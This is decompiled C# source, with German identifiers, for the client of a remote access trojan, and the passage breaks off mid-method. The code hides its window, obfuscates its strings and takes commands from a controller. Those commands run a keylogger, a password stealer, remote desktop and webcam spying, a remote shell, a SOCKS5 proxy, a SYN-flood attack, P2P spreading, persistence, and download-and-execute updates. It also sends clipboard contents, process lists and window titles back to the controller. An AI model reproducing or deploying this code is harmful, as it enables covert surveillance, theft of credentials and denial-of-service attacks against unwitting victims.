using System;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.ServiceProcess;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using ns0;

namespace ns1;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	private Module1.ShowDeskInListview ShowScreenInListview;

	[AccessedThroughProperty("AktuellesFenster")]
	private Module1.AktuellesFensterauslesen _AktuellesFenster;

	[AccessedThroughProperty("Client")]
	private VictimCLient _Client;

	[AccessedThroughProperty("ShellKonsole")]
	private Module1.ShellKonsole _ShellKonsole;

	[AccessedThroughProperty("Keylogger")]
	private Module1.Keylogger _Keylogger;

	[AccessedThroughProperty("Socks5Manager")]
	private Module1.Socks5Handler _Socks5Manager;

	private Module1.RemoteDesktop RemoteDesktop;

	private Module1.RemoteWebcam RemoteWebcam;

	private Module1.PasswortStealer Passwortstealer;

	private Module1.OfflineKeylogger OfKeylogger;

	[AccessedThroughProperty("FunFunktionen")]
	private FunFunktionen _FunFunktionen;

	public Mutex m;

	[AccessedThroughProperty("DateiSuche")]
	private Module1.DateiSuche _DateiSuche;

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	private virtual Module1.AktuellesFensterauslesen AktuellesFenster
	{
		[DebuggerNonUserCode]
		get
		{
			return _AktuellesFenster;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			Module1.AktuellesFensterauslesen.NeuesFensterEventHandler value2 = AktuellesFenster_NeuesFenster;
			if (_AktuellesFenster != null)
			{
				_AktuellesFenster.NeuesFenster -= value2;
			}
			_AktuellesFenster = value;
			if (_AktuellesFenster != null)
			{
				_AktuellesFenster.NeuesFenster += value2;
			}
		}
	}

	public virtual VictimCLient Client
	{
		[DebuggerNonUserCode]
		get
		{
			return _Client;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			VictimCLient.OnReconnectEventHandler value2 = Client_OnReconnect;
			VictimCLient.OnConnectEventHandler value3 = Client_OnConnect;
			VictimCLient.NewMessageEventHandler value4 = Client_NewMessage;
			if (_Client != null)
			{
				_Client.OnReconnect -= value2;
				_Client.OnConnect -= value3;
				_Client.NewMessage -= value4;
			}
			_Client = value;
			if (_Client != null)
			{
				_Client.OnReconnect += value2;
				_Client.OnConnect += value3;
				_Client.NewMessage += value4;
			}
		}
	}

	private virtual Module1.ShellKonsole ShellKonsole
	{
		[DebuggerNonUserCode]
		get
		{
			return _ShellKonsole;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			Module1.ShellKonsole.ShellAnswerEventHandler value2 = ShellKonsole_ShellAnswer;
			if (_ShellKonsole != null)
			{
				_ShellKonsole.ShellAnswer -= value2;
			}
			_ShellKonsole = value;
			if (_ShellKonsole != null)
			{
				_ShellKonsole.ShellAnswer += value2;
			}
		}
	}

	private virtual Module1.Keylogger Keylogger
	{
		[DebuggerNonUserCode]
		get
		{
			return _Keylogger;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			Module1.Keylogger.NewOnlineKeyLoggsEventHandler value2 = Keylogger_NewOnlineKeyLoggs;
			if (_Keylogger != null)
			{
				_Keylogger.NewOnlineKeyLoggs -= value2;
			}
			_Keylogger = value;
			if (_Keylogger != null)
			{
				_Keylogger.NewOnlineKeyLoggs += value2;
			}
		}
	}

	private virtual Module1.Socks5Handler Socks5Manager
	{
		[DebuggerNonUserCode]
		get
		{
			return _Socks5Manager;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			Module1.Socks5Handler.SendTextEventHandler value2 = Socks5Manager_SendText;
			if (_Socks5Manager != null)
			{
				_Socks5Manager.SendText -= value2;
			}
			_Socks5Manager = value;
			if (_Socks5Manager != null)
			{
				_Socks5Manager.SendText += value2;
			}
		}
	}

	private virtual FunFunktionen FunFunktionen
	{
		[DebuggerNonUserCode]
		get
		{
			return _FunFunktionen;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			FunFunktionen.ChatMSGEventHandler value2 = FunFunktionen_ChatMSG;
			if (_FunFunktionen != null)
			{
				_FunFunktionen.ChatMSG -= value2;
			}
			_FunFunktionen = value;
			if (_FunFunktionen != null)
			{
				_FunFunktionen.ChatMSG += value2;
			}
		}
	}

	private virtual Module1.DateiSuche DateiSuche
	{
		[DebuggerNonUserCode]
		get
		{
			return _DateiSuche;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			Module1.DateiSuche.DateiGefundenEventHandler value2 = DateiSuche_DateiGefunden;
			if (_DateiSuche != null)
			{
				_DateiSuche.DateiGefunden -= value2;
			}
			_DateiSuche = value;
			if (_DateiSuche != null)
			{
				_DateiSuche.DateiGefunden += value2;
			}
		}
	}

	public Form1()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		ShowScreenInListview = new Module1.ShowDeskInListview();
		AktuellesFenster = new Module1.AktuellesFensterauslesen();
		Client = new VictimCLient();
		ShellKonsole = new Module1.ShellKonsole();
		Keylogger = new Module1.Keylogger();
		Socks5Manager = new Module1.Socks5Handler();
		RemoteDesktop = new Module1.RemoteDesktop();
		RemoteWebcam = new Module1.RemoteWebcam();
		Passwortstealer = new Module1.PasswortStealer();
		OfKeylogger = new Module1.OfflineKeylogger();
		FunFunktionen = new FunFunktionen();
		DateiSuche = new Module1.DateiSuche();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		TextBox1 = new TextBox();
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		((Control)this).SuspendLayout();
		((Control)TextBox1).set_Font(new Font(GClass0.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox textBox = TextBox1;
		Point location = new Point(12, 12);
		((Control)textBox).set_Location(location);
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name(GClass0.smethod_0("\\Ţɾͱцլٺ\u0730"));
		TextBox textBox2 = TextBox1;
		Size size = new Size(347, 215);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		TextBox1.set_Text(componentResourceManager.GetString(GClass0.smethod_0("Yũɳ;ыէٿ\u0737\u082bॐ੦\u0b7a\u0c75")));
		Timer1.set_Interval(200);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(371, 238);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name(GClass0.smethod_0("Cūɱ\u036fа"));
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			Module1.CriticalProzess.ProtectProcess(bProtect: false);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Timer1.Stop();
		try
		{
			Process[] processesByName = Process.GetProcessesByName(GClass0.smethod_0("vŲɹ"));
			foreach (Process process in processesByName)
			{
				process.Kill();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ(GClass0.smethod_0("fŶɵ\u0360Ѣն٠")) + GClass0.smethod_0("TŲɶͽЪզٺݤ"));
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("TŲɶͽЪզٺݤ"));
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			((Control)this).set_Visible(false);
			((Control)this).Hide();
			if (!Module2.DDebug)
			{
				Module1.StubStringEinlesen();
			}
			else
			{
				Module2.VerbindungsInformationen item = default(Module2.VerbindungsInformationen);
				item.IpAdresse = GClass0.smethod_0("8ĺȰ\u0328еԪسܬ࠰");
				item.TransferPort = 8881;
				item.ConnectPort = 8888;
				Module2.VerbindungsDaten.Add(item);
			}
			if (Module2.Antis)
			{
				Timer2.Start();
			}
			if (Module1.ServerInstallation())
			{
				Client.Start();
				if (Module2.OffKeylogger)
				{
					OfKeylogger.Start();
				}
				if (Module2.Persistenz)
				{
					try
					{
						Process[] processesByName = Process.GetProcessesByName(GClass0.smethod_0("vŲɹ"));
						foreach (Process process in processesByName)
						{
							process.Kill();
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					try
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ(GClass0.smethod_0("fŶɵ\u0360Ѣն٠")) + GClass0.smethod_0("TŲɶͽЪզٺݤ"));
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					try
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("TŲɶͽЪզٺݤ"));
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					Timer1.Start();
				}
			}
			else
			{
				Application.Exit();
			}
			if (Module2.P2PSpread)
			{
				Module1.Spread.P2pSpread();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			Application.Exit();
			ProjectData.ClearProjectError();
		}
	}

	private void AktuellesFenster_NeuesFenster(string Titel)
	{
		try
		{
			Keylogger.AktuellesFenster = Titel;
			OfKeylogger.AktuellesFenster = Titel;
			Client.Senden(GClass0.smethod_0("UŸɦ\u0364ѵգ٢ݨ\u087f\u094d੯୧౻൳\u0e63\u0f77ဧᄨሩጢ") + Titel);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Client_NewMessage(string[] Befehle)
	{
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("gŬɲ\u0378"), false) == 0)
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Befehle[1], Befehle[2]);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("WŪɺ\u034eѠբٺݫࡧ०ੴୡ\u0c50൦\u0e7a\u0f75"), false) == 0)
		{
			try
			{
				Client.Senden(Clipboard.GetText());
				Process process = new Process();
				process = Process.GetProcessesByName(GClass0.smethod_0(""))[0];
				_ = (object)process.MainWindowHandle;
				Interaction.MsgBox((object)Clipboard.GetText(), (MsgBoxStyle)0, (object)null);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("KŤɨ\u0365ѮՐ٢ݱࡪ"), false) == 0)
		{
			try
			{
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("0"), false) == 0)
				{
					FunFunktionen.DisableTaskmanager(b: true);
				}
				else
				{
					FunFunktionen.DisableTaskmanager(b: false);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Jūɩ\u0366ѯՑ٧ݦ"), false) == 0)
		{
			try
			{
				if (Operators.CompareString(Befehle[1], GClass0.smethod_0("0"), false) == 0)
				{
					FunFunktionen.DisableRegedit(b: true);
				}
				else
				{
					FunFunktionen.DisableRegedit(b: false);
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("AũɶͰѰՁ٭ݹ"), false) == 0)
		{
			try
			{
				FunFunktionen.InputChatBox(Befehle[1], Befehle[2]);
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("^Źɻ\u036fѻ՛پݨࡖ॰\u0a62୰\u0c75"), false) == 0)
		{
			try
			{
				if (!Syn.IsEnabled)
				{
					Syn.StopSuperSyn();
				}
				Syn.Host = Befehle[1];
				Syn.Port = Conversions.ToInteger(Befehle[2]);
				Syn.SuperSynSockets = Conversions.ToInteger(Befehle[3]);
				Syn.Threads = Conversions.ToInteger(Befehle[4]);
				Syn.StartSuperSyn();
				Syn.DDOSStatus = GClass0.smethod_0("[űȵ\u032eўյ٥ܪࡏ।੨୩ౡത\u0e62\u0f77\u1067") + Syn.Host + GClass0.smethod_0(",") + Conversions.ToString(Syn.Port) + GClass0.smethod_0(",") + Conversions.ToString(Syn.SuperSynSockets) + GClass0.smethod_0(",") + Conversions.ToString(Syn.Threads);
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("^ŵɥ\u034cѥէ٨ݢࡖ॰੬୲\u0c71"), false) == 0)
		{
			try
			{
				Syn.StopSuperSyn();
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("RŸɮ\u0360Ѫթ\u065dݣࡪॼ੮୫౫൫\u0e77ཫၻ"), false) == 0)
		{
			try
			{
				MySettingsProperty.Settings.VictimNotiz = Befehle[1];
				((ApplicationSettingsBase)MySettingsProperty.Settings).Save();
				Client.Senden(GClass0.smethod_0("Yŧɮ\u0378Ѣէهݧ\u0873९\u0a7fଧనഩย") + MySettingsProperty.Settings.VictimNotiz);
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("\\Źɥͳѭմٵݩ\u086d॰੶\u0b64"), false) == 0)
		{
			try
			{
				string text = GClass0.smethod_0("_żɢͶѮչٺݤ\u086eॵ\u0a71ୡహഹ\u0e3b");
				Process[] processes = Process.GetProcesses();
				foreach (Process process2 in processes)
				{
					try
					{
						text = text + process2.ProcessName + GClass0.smethod_0("}ĩɿ") + process2.Id + GClass0.smethod_0("}ĩɿ") + process2.MainWindowTitle + GClass0.smethod_0("}ĩɿ") + process2.MainModule!.FileName + GClass0.smethod_0("'Ĩȩ\u0322");
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
				}
				Client.Senden(text);
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Gŭɰ\u0340Ѫը٧ݧ\u0873"), false) == 0)
		{
			try
			{
				if (!((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(Befehle[1]))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().CreateDirectory(Befehle[1]);
				}
			}
			catch (Exception projectError10)
			{
				ProjectData.SetProjectError(projectError10);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("aŠɤ\u036bрժ٨ݧࡧॳ"), false) == 0)
		{
			try
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(Befehle[1]))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteDirectory(Befehle[1], (DeleteDirectoryOption)5);
				}
			}
			catch (Exception projectError11)
			{
				ProjectData.SetProjectError(projectError11);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("@ţɥ\u0364їմ٪ݾࡦॱੲ"), false) == 0)
		{
			try
			{
				Process.GetProcessById(Conversions.ToInteger(Befehle[1])).Kill();
			}
			catch (Exception projectError12)
			{
				ProjectData.SetProjectError(projectError12);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("NŨɼ\u0362ѯՖٱݠࡪ।"), false) == 0)
		{
			try
			{
				DateiSuche.Start(Befehle[1], Befehle[2]);
			}
			catch (Exception projectError13)
			{
				ProjectData.SetProjectError(projectError13);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("_žɩ\u0361ѭՔٲݪ\u0874ॳ੧୯"), false) == 0)
		{
			try
			{
				DateiSuche.Stopp();
			}
			catch (Exception projectError14)
			{
				ProjectData.SetProjectError(projectError14);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("{ŷɴ\u0360ѧի٧ݯ"), false) == 0)
		{
			try
			{
				Module1.Sprechen(Befehle[1]);
			}
			catch (Exception projectError15)
			{
				ProjectData.SetProjectError(projectError15);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("MŬɼ\u0357ѯզ\u0670ݶ\u0870।"), false) == 0)
		{
			try
			{
				Module2.VictimID = Befehle[2];
				string pfad = Befehle[1];
				Module1.ImagePreview imagePreview = new Module1.ImagePreview();
				imagePreview.Pfad = pfad;
				imagePreview.StartDesktopCapture();
			}
			catch (Exception projectError16)
			{
				ProjectData.SetProjectError(projectError16);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("DŢɭ\u0365ѻե٦ݲ\u086c५੭୧౯"), false) == 0)
		{
			try
			{
				string text2 = GClass0.smethod_0("Xžɩ\u0361ѿա٪ݾࡠ१੩\u0b63౫ധศ༩ဢ");
				text2 = text2 + Module2._Ipadresse + GClass0.smethod_0("zĨɼ\u032f");
				text2 = text2 + Module2._ConnectionPort + GClass0.smethod_0("zĨɼ\u032f");
				text2 = text2 + Module2._TransferPort + GClass0.smethod_0("zĨɼ\u032f");
				text2 = text2 + Module2.Passwort + GClass0.smethod_0("zĨɼ\u032f");
				text2 = text2 + Module2.ReconnectTime + GClass0.smethod_0("zĨɼ\u032f");
				text2 = text2 + Module2.ServerInstallieren + GClass0.smethod_0("zĨɼ\u032f");
				text2 = text2 + Module2.Autostart_CurrentUser + GClass0.smethod_0("zĨɼ\u032f");
				text2 = text2 + Module2.Autostart_LocalMashine + GClass0.smethod_0("zĨɼ\u032f");
				text2 = text2 + Module2.Autostart_AxtivX + GClass0.smethod_0("zĨɼ\u032f");
				text2 = text2 + Module2.MutexString + GClass0.smethod_0("zĨɼ\u032f");
				text2 = text2 + Module2.Attribut_Versteckt + GClass0.smethod_0("zĨɼ\u032f");
				text2 = text2 + Conversions.ToString(Module2.Melt) + GClass0.smethod_0("zĨɼ\u032f");
				text2 = text2 + Module2.SystemProzessSetzen + GClass0.smethod_0("zĨɼ\u032f");
				text2 = text2 + Module2.Persistenz + GClass0.smethod_0("zĨɼ\u032f");
				text2 = text2 + Module2.UAC_Deaktivieren + GClass0.smethod_0("zĨɼ\u032f");
				text2 = text2 + Module2.P2PSpread + GClass0.smethod_0("zĨɼ\u032f");
				text2 = text2 + Module2.Antis + GClass0.smethod_0("zĨɼ\u032f");
				text2 = text2 + Module2.ErrorMessage + GClass0.smethod_0("zĨɼ\u032f");
				text2 = text2 + Module2.ErrorMessageTitel + GClass0.smethod_0("zĨɼ\u032f");
				text2 = text2 + Module2.ErrorMessageText + GClass0.smethod_0("zĨɼ\u032f");
				Client.Senden(text2);
			}
			catch (Exception projectError17)
			{
				ProjectData.SetProjectError(projectError17);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("YŽɩ\u0375ѲՖ٬ݦ\u086e७"), false) == 0)
		{
			try
			{
				ShellKonsole.Start();
			}
			catch (Exception projectError18)
			{
				ProjectData.SetProjectError(projectError18);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("YŽɧͷѶՖ٬ݦ\u086e७"), false) == 0)
		{
			try
			{
				ShellKonsole.Stopp();
			}
			catch (Exception projectError19)
			{
				ProjectData.SetProjectError(projectError19);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Xżɯ\u036bѽխفݴࡪ३\u0a56\u0b50\u0c4d"), false) == 0)
		{
			try
			{
				string text3 = Befehle[1];
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("VűɰͲѶաتݦ\u087a।"));
				}
				catch (Exception projectError20)
				{
					ProjectData.SetProjectError(projectError20);
					ProjectData.ClearProjectError();
				}
				((ServerComputer)MyProject.Computer).get_Network().DownloadFile(text3, Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("VűɰͲѶաتݦ\u087a।"));
				Module1.UpdateFromFile();
			}
			catch (Exception projectError21)
			{
				ProjectData.SetProjectError(projectError21);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("TŠɩ\u036cѴդ"), false) == 0)
		{
			Timer1.Stop();
			if (Module2.Persistenz)
			{
				try
				{
					Process[] processesByName = Process.GetProcessesByName(GClass0.smethod_0("vŲɹ"));
					foreach (Process process3 in processesByName)
					{
						process3.Kill();
					}
				}
				catch (Exception projectError22)
				{
					ProjectData.SetProjectError(projectError22);
					ProjectData.ClearProjectError();
				}
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ(GClass0.smethod_0("fŶɵ\u0360Ѣն٠")) + GClass0.smethod_0("TŲɶͽЪզٺݤ"));
				}
				catch (Exception projectError23)
				{
					ProjectData.SetProjectError(projectError23);
					ProjectData.ClearProjectError();
				}
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("TŲɶͽЪզٺݤ"));
				}
				catch (Exception projectError24)
				{
					ProjectData.SetProjectError(projectError24);
					ProjectData.ClearProjectError();
				}
			}
			Module1.smethod_0();
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("XŢɬ\u0364ѫդ٠ݢࡦ४੭"), false) == 0)
		{
			try
			{
				ShellKonsole.Schreiben(Befehle[1]);
			}
			catch (Exception projectError25)
			{
				ProjectData.SetProjectError(projectError25);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Wŷɢͻѻաٽݏࡪॺ\u0a7d\u0b7d\u0c75\u0d63๖\u0f70\u1062ᅰት"), false) == 0)
		{
			try
			{
				Module2.VictimID = Befehle[1];
				RemoteDesktop.Start();
			}
			catch (Exception projectError26)
			{
				ProjectData.SetProjectError(projectError26);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Wŷɢͻѻաٽݏࡪॺ\u0a7d\u0b7d\u0c75\u0d63๖\u0f70\u106cᅲቱ"), false) == 0)
		{
			try
			{
				RemoteDesktop.Stopp();
			}
			catch (Exception projectError27)
			{
				ProjectData.SetProjectError(projectError27);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Cŵɢ\u0361ѹթ\u064fݯ\u087a\u0963ੳ୩\u0c75\u0d42\u0e62\u0f71ၵ"), false) == 0)
		{
			try
			{
				RemoteDesktop.Geschwindigkeit = Conversions.ToInteger(Befehle[1]);
			}
			catch (Exception projectError28)
			{
				ProjectData.SetProjectError(projectError28);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("@Ŵɽ\u0360Ѻըوݮ\u0879\u0962\u0a7c୨\u0c76ൔ\u0e71རၮᅨ"), false) == 0)
		{
			try
			{
				RemoteDesktop.int_0 = Conversions.ToInteger(Befehle[1]);
			}
			catch (Exception projectError29)
			{
				ProjectData.SetProjectError(projectError29);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Cŵɢ\u0361ѹթ\u065cݯ\u086b५੦୫\u0c56൰\u0e62\u0f70ၵ"), false) == 0)
		{
			try
			{
				Module2.VictimID = Befehle[1];
				RemoteWebcam.WebCamID = Conversions.ToInteger(Befehle[2]);
				RemoteWebcam.Start();
			}
			catch (Exception projectError30)
			{
				ProjectData.SetProjectError(projectError30);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("HŸɬ\u0369ѳՕ٪ݧࡨॱ\u0a34"), false) == 0)
		{
			try
			{
				int port = Conversions.ToInteger(Befehle[1]);
				Socks5Manager.NewSocks5(port);
			}
			catch (Exception projectError31)
			{
				ProjectData.SetProjectError(projectError31);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Cŵɢ\u0361ѹթ\u065cݯ\u086b५੦୫\u0c56൰\u0e6c\u0f72\u1071"), false) == 0)
		{
			try
			{
				RemoteWebcam.Stopp();
			}
			catch (Exception projectError32)
			{
				ProjectData.SetProjectError(projectError32);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("BŪɣ\u0362Ѹծ\u065dݬࡪ।੧୨\u0c42\u0d62\u0e71\u0f75"), false) == 0)
		{
			try
			{
				RemoteWebcam.Geschwindigkeit = Conversions.ToInteger(Befehle[1]);
			}
			catch (Exception projectError33)
			{
				ProjectData.SetProjectError(projectError33);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Cŵɢ\u0361ѹթ\u065cݯ\u086b५੦୫\u0c54൱\u0e62\u0f6e\u1068"), false) == 0)
		{
			try
			{
				RemoteWebcam.int_0 = Conversions.ToInteger(Befehle[1]);
			}
			catch (Exception projectError34)
			{
				ProjectData.SetProjectError(projectError34);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Cŵɢ\u0361ѹթ\u065cݯ\u086b५੦୫\u0c56൰\u0e6c\u0f72\u1071"), false) == 0)
		{
			try
			{
				RemoteWebcam.Stopp();
			}
			catch (Exception projectError35)
			{
